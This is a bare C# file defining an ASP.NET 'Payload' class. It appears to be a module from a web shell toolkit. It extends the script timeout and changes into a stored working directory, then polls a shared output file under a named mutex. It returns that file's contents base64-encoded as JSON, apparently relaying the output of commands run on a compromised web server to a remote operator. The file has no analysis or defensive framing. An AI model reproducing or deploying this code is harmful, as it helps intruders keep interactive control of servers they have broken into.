using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;

public class Payload
{

    [DataContract]
    class Ret
    {

        [DataMember]
        public int code = 1;

        [DataMember]
        public string msg = "";
    }
    Ret ret;
    public string Run()
    {
        HttpContext.Current.Server.ScriptTimeout = 3600;
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        Mutex mut = new Mutex(false, "test123");
        if (File.Exists(Global.outfile))
        {
            while (true)
            {
                byte[] data;
                try
                {
                    mut.WaitOne();
                    data = File.ReadAllBytes(Global.outfile);
                    File.WriteAllText(Global.outfile, "");
                }
                catch (FileNotFoundException)
                {
                    ret.code = -1;
                    break;
                }finally{
                    mut.ReleaseMutex();
                }

                if (data.Length>0)
                {
                    ret.msg = Convert.ToBase64String(data);
                    break;
                }
                Thread.Sleep(200);
            }
        }
        else
        {
            ret.code = -1;
        }
        return Global.json_encode(ret);
    }
}